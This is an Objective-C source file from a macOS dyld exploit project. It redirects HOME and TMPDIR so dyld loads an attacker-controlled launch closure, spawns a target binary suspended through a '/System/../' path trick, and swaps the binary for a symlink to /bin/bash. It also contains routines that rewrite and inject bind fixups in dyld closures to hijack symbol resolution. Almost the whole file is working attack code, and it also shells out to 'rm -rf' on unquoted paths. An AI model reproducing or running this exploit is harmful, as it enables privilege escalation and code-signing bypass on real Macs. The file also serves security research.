//
//  dyld_closure.m
//  dyldExploitMacOS_x86_64
//
//  Created by Linus Henze.
//  Copyright Â© 2021 Linus Henze. All rights reserved.
//

#import <spawn.h>

#import "dyld_closure.h"

extern char **environ;

pid_t launchWithClosure(NSString *exe, NSString *pwnPath, BOOL copyPhase, char **argv) {
    if (copyPhase) {
        // First delete old dirs
        system([[NSString stringWithFormat: @"rm -rf %@", pwnPath] UTF8String]);
    }
    
    // Then create new dirs
    // Big Sur and Catalina
    system([[NSString stringWithFormat: @"mkdir -p %@/Library/Containers/Data/Library/Caches/com.apple.dyld", pwnPath] UTF8String]);
    
    // Copy/Link exe
    system([[NSString stringWithFormat: @"rm -f %@/exe", pwnPath] UTF8String]);
    if (copyPhase) {
        system([[NSString stringWithFormat: @"cp %@ %@/exe", exe, pwnPath] UTF8String]);
    } else {
        system([[NSString stringWithFormat: @"ln -s %@ %@/exe", exe, pwnPath] UTF8String]);
    }
    
    // Set HOME env (Big Sur)
    char *origHome = getenv("HOME");
    setenv("HOME", [[NSString stringWithFormat: @"%@/Library/Containers/Data", pwnPath] UTF8String], 1);
    
    // Set TMPDIR env (Catalina)
    char *origTmpdir = getenv("TMPDIR");
    setenv("TMPDIR", [[NSString stringWithFormat: @"%@/Library/Containers/Data/Library/Caches", pwnPath] UTF8String], 1);
    
    // Spawn suspended
    posix_spawnattr_t attr;
    int status = posix_spawnattr_init(&attr);
    if (status != 0) {
        perror("can't init spawnattr");
        exit(status);
    }

    status = posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
    if (status != 0) {
        perror("can't set flags");
        exit(status);
    }
    
    posix_spawn_file_actions_t fileAct;
    status = posix_spawn_file_actions_init(&fileAct);
    if (status != 0) {
        perror("can't init file actions");
        exit(status);
    }
    
    if (copyPhase) {
        status = posix_spawn_file_actions_addclose(&fileAct, STDOUT_FILENO);
        if (status != 0) {
            perror("can't set file actions");
            exit(status);
        }
        
        status = posix_spawn_file_actions_addclose(&fileAct, STDERR_FILENO);
        if (status != 0) {
            perror("can't set file actions");
            exit(status);
        }
    }
    
    // Path has to start with /System for the exploit to work
    // /System/../ is ok
    pid_t pid;
    status = posix_spawn(&pid, [[NSString stringWithFormat: @"/System/../%@/exe", pwnPath] UTF8String], &fileAct, &attr, argv, environ);
    if (status != 0) {
        printf("posix_spawn: %s\n", strerror(status));
        exit(status);
    }
    
    // Replace exe
    system([[NSString stringWithFormat: @"rm -f %@/exe", pwnPath] UTF8String]);
    system([[NSString stringWithFormat: @"ln -s /bin/bash %@/exe", pwnPath] UTF8String]);
    
    // Restore HOME
    setenv("HOME", origHome, 1);
    
    // Restore TEMPDIR
    setenv("TEMPDIR", origTmpdir, 1);
    
    // Continue
    kill(pid, SIGCONT);
    
    return pid;
}

BOOL closureReplaceBind(void *closure, size_t closureSize, uint64_t vmOffset, uint64_t newValue) {
    TypedBytes *header = (TypedBytes*) closure;
    if (header->type != launchClosure || header->payloadLength > (closureSize - sizeof(TypedBytes))) {
        return NO;
    }
    
    size_t pos = sizeof(TypedBytes);
    while (pos < header->payloadLength) {
        TypedBytes *cur = (TypedBytes*) &closure[pos];
        if (cur->type == imageArray && (pos + sizeof(ImageArray)) < header->payloadLength) {
            // Found image array
            // First image *should* be the main image
            ImageArray *ar = (ImageArray*) cur;
            if (ar->count != 1 || (pos + sizeof(ImageArray) + sizeof(AnImage)) > header->payloadLength) {
                return NO;
            }
            
            pos += sizeof(ImageArray) + sizeof(AnImage);
            
            AnImage *im = ar->images;
            if (im->type != image) {
                return NO;
            }
            
            for (uint32_t c = 0; c < im->attrCount && pos < header->payloadLength; c++) {
                TypedBytes *cur = (TypedBytes*) &closure[pos];
                if (cur->type == bindFixups) {
                    // There we go!
                    
                    pos += sizeof(TypedBytes);
                    for (size_t pos2 = 0; pos2 < cur->payloadLength && (pos + pos2) < closureSize; pos2 += sizeof(BindPattern)) {
                        BindPattern *ptrn = (BindPattern*) &closure[pos + pos2];
                        
                        if (ptrn->startVmOffset == vmOffset) {
                            ptrn->target.absolute.kind = kindAbsolute;
                            ptrn->target.absolute.value = newValue;
                            return YES;
                        }
                    }
                    
                    return NO;
                }
                
                pos += sizeof(TypedBytes) + cur->payloadLength;
            }
            
            return NO;
        }
        
        pos += sizeof(TypedBytes) + cur->payloadLength;
    }
    
    return NO;
}

// Buffer must be sizeof(TypedBytes) larger than specified in closureSize
BOOL closureInjectBind(void *closure, size_t closureSize, uint64_t vmOffset, ResolvedSymbolTarget *target) {
    TypedBytes *header = (TypedBytes*) closure;
    if (header->type != launchClosure || header->payloadLength > (closureSize - sizeof(TypedBytes))) {
        return NO;
    }
    
    size_t pos = sizeof(TypedBytes);
    while (pos < header->payloadLength) {
        TypedBytes *cur = (TypedBytes*) &closure[pos];
        if (cur->type == imageArray && (pos + sizeof(ImageArray)) < header->payloadLength) {
            // Found image array
            // First image *should* be the main image
            ImageArray *ar = (ImageArray*) cur;
            if (ar->count != 1 || (pos + sizeof(ImageArray) + sizeof(AnImage)) > header->payloadLength) {
                return NO;
            }
            
            pos += sizeof(ImageArray) + sizeof(AnImage);
            
            AnImage *im = ar->images;
            if (im->type != image) {
                return NO;
            }
            
            for (uint32_t c = 0; c < im->attrCount && pos < header->payloadLength; c++) {
                TypedBytes *curInner = (TypedBytes*) &closure[pos];
                if (curInner->type == bindFixups) {
                    // There we go!
                    
                    pos += sizeof(TypedBytes);
                    
                    memmove(&closure[pos + sizeof(BindPattern)], &closure[pos], closureSize - pos);
                    
                    curInner->payloadLength += sizeof(BindPattern);
                    im->payloadLength += sizeof(BindPattern);
                    ar->payloadLength += sizeof(BindPattern);
                    header->payloadLength += sizeof(BindPattern);
                    
                    BindPattern *ptrn = (BindPattern*) &closure[pos];
                    ptrn->startVmOffset = vmOffset;
                    ptrn->repeatCount = 1;
                    ptrn->skipCount = 0;
                    ptrn->target = *target;
                    
                    return YES;
                }
                
                pos += sizeof(TypedBytes) + curInner->payloadLength;
            }
            
            return NO;
        }
        
        pos += sizeof(TypedBytes) + cur->payloadLength;
    }
    
    return NO;
}
